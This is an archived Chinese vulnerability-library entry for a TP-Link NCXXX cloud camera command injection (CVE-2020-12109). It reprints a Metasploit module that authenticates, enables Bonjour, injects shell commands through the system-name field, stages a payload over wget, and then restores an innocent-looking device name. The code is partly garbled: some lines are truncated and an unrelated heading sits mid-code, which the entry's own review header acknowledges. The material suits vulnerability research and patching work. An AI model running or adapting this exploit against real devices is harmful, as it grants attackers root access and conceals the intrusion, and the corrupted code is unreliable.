---
cve: "CVE-2020-12110"
source: "白阁文库 BaizeSec/bylibrary"
id: "vw-87af743ccfe5547f3697cb6b"
entity_id: "ve-87af743ccfe5547f3697cb6b"
schema_version: "1"
title: "TP-Link云摄像头NCXXX系列存在命令注⼊漏洞"
product: "TP-Link NCXXX云摄像头"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "primary"
primary_identifiers: "CVE-2020-12109"
referenced_identifiers: ""
prerequisites: "已认证；NC200/220/230/250及NC260/450直接，NC210需额外配置写入"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/TP-Link/TP-Link%E4%BA%91%E6%91%84%E5%83%8F%E5%A4%B4NCXXX%E7%B3%BB%E5%88%97%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E2%BC%8A%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_status: "unknown"
---

# TP-Link云摄像头NCXXX系列存在命令注⼊漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：TP-Link NCXXX云摄像头
- 本文讨论：CVE-2020-12109 Bonjour命令注入；12110仅NC210配合链
- 版本、权限与配置前提：已认证；NC200/220/230/250及NC260/450直接，NC210需额外配置写入
- 资料类型：截断Metasploit模块转载；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- frontmatter误把引用链CVE-2020-12110当主漏洞，模块References明确12109
- 每行带行号，PASSWORD配置及登录正则被截断，代码内混入“33.SpamTitan 7.07多个RCE漏洞”
- 无固件/修复矩阵，摄像头分类错置网络设备

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 原模块版本、NC210链及安全固件待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


```
1 ##
2 # This module requires Metasploit: https://metasploit.com/download
3 # Current source: https://github.com/rapid7/metasploit-framework
4 ##
5
6 class MetasploitModule < Msf::Exploit::Remote
7 Rank = ExcellentRanking
8
9 include Msf::Exploit::Remote::HttpClient
10 include Msf::Exploit::CmdStager
11
12 def initialize(info = {})
13 super(
14 update_info(
15 info,
16 'Name' => 'TP-Link Cloud Cameras NCXXX Bonjour Command Injection',
17 'Description' => %q{
18 TP-Link cloud cameras NCXXX series (NC200, NC210, NC220, NC230,
19 NC250, NC260, NC450) are vulnerable to an authenticated command
20 injection. In all devices except NC210, despite a check on the name length in
21 swSystemSetProductAliasCheck, no other checks are in place in order
22 to prevent shell metacharacters from being introduced. The system name
23 would then be used in swBonjourStartHTTP as part of a shell command
24 where arbitrary commands could be injected and executed as root. NC210 devices
25 cannot be exploited directly via /setsysname.cgi due to proper input
26 validation. NC210 devices are still vulnerable since swBonjourStartHTTP
27 did not perform any validation when reading the alias name from the
28 configuration file. The configuration file can be written, and code
29 execution can be achieved by combining this issue with CVE-2020-12110.
30 },
31 'Author' => ['Pietro Oliva <pietroliva[at]gmail.com>'],
32 'License' => MSF_LICENSE,
33 'References' =>
34 [
35 [ 'URL', 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12109' ],
36 [ 'URL', 'https://nvd.nist.gov/vuln/detail/CVE-2020-12109' ],
37 [ 'URL', 'https://seclists.org/fulldisclosure/2020/May/2' ],
38 [ 'CVE', '2020-12109']
39 ],
40 'DisclosureDate' => '2020-04-29',
41 'Platform' => 'linux',
42 'Arch' => ARCH_MIPSLE,
43 'Targets' =>
44 [
45 [
46 'TP-Link NC200, NC220, NC230, NC250',
47 {
48 'Arch' => ARCH_MIPSLE,
49 'Platform' => 'linux',
50 'CmdStagerFlavor' => [ 'wget' ]
51 }
52 ],
53 [
54 'TP-Link NC260, NC450',
55 {
56 'Arch' => ARCH_MIPSLE,
57 'Platform' => 'linux',
58 'CmdStagerFlavor' => [ 'wget' ],
59 'DefaultOptions' => { 'SSL' => true }
60 }
61 ]
62 ],
63 'DefaultTarget' => 0
64 )
65 )
66
67 register_options(
68 [
69 OptString.new('USERNAME', [ true, 'The web interface username', 'admin' ]),
70 OptString.new('PASSWORD', [ true, 'The web interface password for the specified userna
71 ]
72 )
73 end
74
75 def login
76 user = datastore['USERNAME']
77 pass = Base64.strict_encode64(datastore['PASSWORD'])
78 if target.name == 'TP-Link NC260, NC450'
79 pass = Rex::Text.md5(pass)
80 end
81
82 print_status("Authenticating with #{user}:#{pass} ...")
83 begin
84 res = send_request_cgi({
85 'uri' => '/login.fcgi',
86 'method' => 'POST',
87 'vars_post' => {
88 'Username' => user,
89 'Password' => pass
90 }
91 })
92 if res.nil? || res.code == 404
93 fail_with(Failure::NoAccess, '/login.fcgi did not reply correctly. Wrong target ip?')
94 end
95 if res.body =~ /\"errorCode\"\:0/ && res.headers.key?('Set-Cookie') && res.body =~ /toke
96 print_good("Logged-in as #{user}")
97 @cookie = res.get_cookies.scan(/\s?([^, ;]+?)=([^, ;]*?)[;,]/)[0][1]
98 print_good("Got cookie: #{@cookie}")
99 @token = res.body.scan(/"(token)":"([^,"]*)"/)[0][1]
100 print_good("Got token: #{@token}")
101 else
102 fail_with(Failure::NoAccess, "Login failed with #{user}:#{pass}")
103 end
104 rescue ::Rex::ConnectionError
105 fail_with(Failure::Unreachable, 'Connection failed')
106 end
107 end
108
109 def enable_bonjour
110 res = send_request_cgi({
111 'uri' => '/setbonjoursetting.fcgi',
112 'method' => 'POST',
113 'encode_params' => false,
114 'cookie' => "sess=#{@cookie}",
115 'vars_post' => {
116 'bonjourState' => '1',
33.SpamTitan 7.07多个RCE漏洞
117 'token' => @token.to_s
118 }
119 })
120 return res
121 rescue ::Rex::ConnectionError
122 vprint_error("Failed connection to the web server at #{rhost}:#{rport}")
123 return nil
124 end
125
126 def sys_name(cmd)
127 res = send_request_cgi({
128 'uri' => '/setsysname.fcgi',
129 'method' => 'POST',
130 'encode_params' => true,
131 'cookie' => "sess=#{@cookie}",
132 'vars_post' => {
133 'sysname' => cmd,
134 'token' => @token.to_s
135 }
136 })
137 return res
138 rescue ::Rex::ConnectionError
139 vprint_error("Failed connection to the web server at #{rhost}:#{rport}")
140 return nil
141 end
142
143 def execute_command(cmd, _opts = {})
144 print_status("Executing command: #{cmd}")
145 sys_name("$(#{cmd})")
146 end
147
148 def exploit
149 login # Get cookie and csrf token
150 enable_bonjour # Enable bonjour service
151 execute_cmdstager # Upload and execute payload
152 sys_name('NC200') # Set back an innocent-looking device name
153 end
154
155 end 
```


---

> 来源：白阁文库 BaizeSec/bylibrary
